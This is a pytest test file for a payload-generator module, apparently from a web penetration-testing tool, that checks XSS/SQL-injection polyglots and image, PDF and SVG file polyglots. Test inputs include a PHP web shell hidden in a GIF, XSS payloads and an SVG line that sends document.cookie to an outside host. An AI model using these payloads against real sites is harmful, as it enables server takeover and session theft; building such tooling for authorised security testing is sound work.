"""Tests for modules/smart_payload/polyglot — cross-context payload generator."""

from __future__ import annotations

import pytest

from modules.smart_payload.polyglot import (
    GARETH_HEYES_XSS,
    POLYGLOTS,
    Polyglot,
    XSS_AND_SQLI,
    all_payloads,
    file_polyglot,
    generate_polyglot,
    select_polyglots,
    svg_xss_polyglot,
)


pytestmark = pytest.mark.unit


# ── Catalogue invariants ─────────────────────────────────────────────────────


def test_catalogue_is_non_empty():
    assert len(POLYGLOTS) >= 6
    assert all(isinstance(p, Polyglot) for p in POLYGLOTS)


def test_every_polyglot_has_payload_and_contexts():
    for p in POLYGLOTS:
        assert p.name
        assert p.payload
        assert p.contexts


def test_polyglot_names_are_unique():
    names = [p.name for p in POLYGLOTS]
    assert len(names) == len(set(names))


def test_gareth_heyes_payload_is_xss_marker():
    # Sanity: the classic polyglot is famous for its
    # ``oNcliCk=alert()`` substring — guard against accidental edits.
    assert "alert(" in GARETH_HEYES_XSS.payload
    assert "html_attr_quoted" in GARETH_HEYES_XSS.contexts


def test_xss_sqli_polyglot_contains_both_sql_and_html():
    assert "SELECT" in XSS_AND_SQLI.payload.upper()
    assert "<svg" in XSS_AND_SQLI.payload.lower() or "<script" in XSS_AND_SQLI.payload.lower()


# ── Selection helpers ───────────────────────────────────────────────────────


def test_select_polyglots_filters_by_context():
    sql_only = select_polyglots(["sql_string"])
    assert all("sql_string" in p.contexts for p in sql_only)
    assert XSS_AND_SQLI in sql_only


def test_select_polyglots_empty_request_returns_everything():
    assert len(select_polyglots([])) == len(POLYGLOTS)


def test_select_polyglots_unmatched_context_returns_empty():
    assert select_polyglots(["does_not_exist"]) == []


def test_generate_polyglot_returns_strings_only():
    payloads = generate_polyglot(["html_text"])
    assert all(isinstance(p, str) for p in payloads)
    assert payloads  # html_text is in many catalogue entries


def test_all_payloads_matches_catalogue_length():
    assert len(all_payloads()) == len(POLYGLOTS)


# ── File polyglots ─────────────────────────────────────────────────────────


def test_jpeg_polyglot_starts_with_jpeg_magic():
    blob = file_polyglot("jpeg", "<script>alert(1)</script>")
    assert blob.startswith(b"\xff\xd8\xff")
    assert b"<script>alert(1)</script>" in blob
    assert blob.endswith(b"\xff\xd9")


def test_gif_polyglot_starts_with_gif_magic():
    blob = file_polyglot("gif", "<?php system($_GET[c]); ?>")
    assert blob.startswith(b"GIF89a")
    assert b"<?php system" in blob


def test_pdf_polyglot_starts_with_pdf_magic_and_ends_with_eof():
    blob = file_polyglot("pdf", "<svg/onload=alert(1)>")
    assert blob.startswith(b"%PDF-")
    assert blob.endswith(b"%%EOF\n")
    assert b"<svg/onload=alert(1)>" in blob


def test_file_polyglot_unsupported_kind_raises():
    with pytest.raises(ValueError):
        file_polyglot("bmp", "x")


# ── SVG XSS ────────────────────────────────────────────────────────────────


def test_svg_polyglot_embeds_payload():
    blob = svg_xss_polyglot("fetch('//x/'+document.cookie)")
    assert b"<svg" in blob and b"</svg>" in blob
    assert b"fetch(" in blob


def test_svg_polyglot_default_alert():
    blob = svg_xss_polyglot()
    assert b"alert(1)" in blob
